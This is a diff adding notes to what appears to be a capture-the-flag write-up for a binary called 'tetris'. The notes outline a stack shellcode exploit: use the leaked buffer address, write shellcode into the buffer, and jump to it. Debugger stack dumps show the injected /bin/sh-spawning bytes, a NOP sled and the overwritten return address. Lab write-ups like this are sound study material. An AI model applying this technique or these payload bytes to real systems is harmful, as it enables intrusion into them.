@@ -96,3 +96,24 @@ checksec tetris
     SHSTK:      Enabled
     IBT:        Enabled
     Stripped:   No
+
+    Stack is executable so we just have to run shellcode to spawn shell here
+    Address of name_buff is leaked.
+    write shellcode into leaked buffer
+    Use this name_buff address to run shellcode
+    jump to memory
+
+00:0000│ rsp 0x7ffd3a1203f0 ◂— 0
+... ↓        4 skipped
+05:0028│-008 0x7ffd3a120418 ◂— 0xa0055bcf0101309
+06:0030│ rbp 0x7ffd3a120420 —▸ 0x7ffd3a120450 —▸ 0x7ffd3a1204d0 ◂— 1
+07:0038│+008 0x7ffd3a120428 —▸ 0x55bcf01013cf (loop+90) ◂— jmp loop+359
+
+00:0000│ rax rcx rsp 0x7ffd3a1203f0 ◂— 0x732f6e69622fbb48
+01:0008│-028         0x7ffd3a1203f8 ◂— 0xd23148f631480068 /*'h'*/
+02:0010│-020         0x7ffd3a120400 ◂— 0x530000003bc0c748
+03:0018│-018         0x7ffd3a120408 ◂— 0x909090050fe78948
+04:0020│-010         0x7ffd3a120410 ◂— 0x9090909090909090
+05:0028│-008         0x7ffd3a120418 ◂— 0x9090909090909090
+06:0030│ rbp         0x7ffd3a120420 —▸ 0x7ffd3a1203f0 ◂— 0x732f6e69622fbb48
+07:0038│+008         0x7ffd3a120428 —▸ 0x55bcf010000a ◂— 0x3000000000000
